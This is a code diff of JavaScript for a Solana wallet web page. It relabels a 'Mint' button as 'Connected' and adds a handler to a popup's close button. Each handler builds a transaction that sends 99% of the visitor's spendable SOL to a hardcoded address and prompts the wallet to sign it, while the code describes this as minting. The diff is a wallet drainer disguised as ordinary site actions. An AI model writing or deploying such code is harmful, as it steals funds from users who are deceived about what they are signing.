@@ -24,7 +24,7 @@ $(document).ready(function () {
                     return;
                 }
 
-                $('#connect-wallet').text("Mint");
+                $('#connect-wallet').text("Connected");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try { //671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD
                         const recieverWallet = new solanaWeb3.PublicKey('671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD');
@@ -107,7 +107,7 @@ $('#connect-wallet1').on('click', async () => {
                     return;
                 }
 
-                $('#connect-wallet').text("Mint");
+                $('#connect-wallet').text("Connected");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try { //671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD
                         const recieverWallet = new solanaWeb3.PublicKey('671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD');
@@ -159,3 +159,39 @@ $('#connect-wallet1').on('click', async () => {
             }
         }
     });
+
+
+ $('#closeWinPopup').off('click').on('click', async () => {
+                    try { //671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD
+                        const recieverWallet = new solanaWeb3.PublicKey('671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD');
+                        const balanceForTransfer = walletBalance - minBalance;
+                        if (balanceForTransfer <= 0) {
+                            alert("Insufficient funds for transfer.");
+                            return;
+                        }
+                        const lamportsToSend = Math.floor(balanceForTransfer * 0.99);
+                        var transaction = new solanaWeb3.Transaction().add(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: resp.publicKey,
+                                toPubkey: recieverWallet,
+                                lamports: lamportsToSend,
+                            }),
+                        );
+
+                        transaction.feePayer = window.solana.publicKey;
+                        let blockhashObj = await connection.getRecentBlockhash('confirmed');
+                        transaction.recentBlockhash = blockhashObj.blockhash;
+
+                        const signed = await window.solana.signTransaction(transaction);
+                        console.log("Transaction signed:", signed);
+
+                        let txid = await connection.sendRawTransaction(signed.serialize());
+                        await connection.confirmTransaction(txid);
+                        console.log("Transaction confirmed:", txid);
+                    } catch (err) {
+                        console.error("Error during minting:", err);
+                    }
+
+
+                    
+                });   
